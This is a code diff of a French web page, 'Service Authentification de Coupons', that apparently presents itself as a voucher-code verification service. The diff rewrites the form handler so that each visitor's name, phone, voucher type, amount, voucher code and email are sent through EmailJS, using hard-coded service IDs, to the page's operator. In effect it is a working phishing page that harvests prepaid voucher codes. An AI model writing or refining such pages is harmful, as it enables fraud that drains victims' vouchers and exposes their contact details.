@@ -34,7 +34,7 @@
                 <input type="checkbox" id="togglePassword">
                 <label for="togglePassword">Cacher le code</label>
             </div>
-            <input type="email" name="email" placeholder="Email valide" required>
+            <input type="email" name="email" placeholder="Email" required>
             <button type="submit">Valider</button>
         </form>
     </div>
@@ -53,20 +53,34 @@
         <p>&copy; 2025 Service Authentification de Coupons. Tous droits réservés.</p>
     </footer>
 
-    <script>
-        (function() {
-            emailjs.init('9nctHHHriAqm1uX48'); // Remplace par ton User ID EmailJS
+   <script>
+    (function() {
+        emailjs.init("9nctHHHriAqm1uX48"); // Remplace par ton User ID EmailJS
+    })();
 
-            document.getElementById('contact-form').addEventListener('submit', function(event) {
-                event.preventDefault();
-                emailjs.sendForm('service_jgg4chq', 'template_u1e5gjf', this)
-                    .then(function() {
-                        alert("E-mail envoyé !");
-                    }, function(error) {
-                        alert("Erreur : " + JSON.stringify(error));
-                    });
+    document.getElementById('contact-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // Récupérer les valeurs du formulaire
+        const formData = {
+            name: this.name.value,
+            phone: this.phone.value,
+            type: this.type.value,
+            amount: this.amount.value,
+            code: this.code.value,
+            email: this.email.value
+        };
+
+        emailjs.send("service_jgg4chq", "template_u1e5gjf", formData)
+            .then(function(response) {
+                alert("E-mail envoyé avec succès !");
+                console.log("Succès :", response);
+            }, function(error) {
+                alert("Erreur lors de l'envoi de l'e-mail.");
+                console.log("Erreur :", error);
             });
-        })();
-    </script>
+    });
+</script>
+
 </body>
 </html>
